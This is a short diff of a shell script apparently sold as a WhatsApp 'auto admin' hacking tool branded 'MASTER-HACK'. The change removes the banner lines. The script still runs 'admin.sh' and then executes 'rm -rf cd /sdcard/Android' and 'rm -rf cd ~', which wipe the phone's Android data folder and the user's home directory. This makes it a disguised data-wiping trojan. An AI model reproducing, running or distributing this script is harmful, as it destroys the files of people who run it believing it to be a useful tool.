@@ -9,10 +9,7 @@ cd AUTO-ADMIN_WHATSAPP
 
 bash admin.sh
 clear
-Banner
-figlet AUTO-ADMIN_WHATSAPP
 
-figlet MASTER-HACK
 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
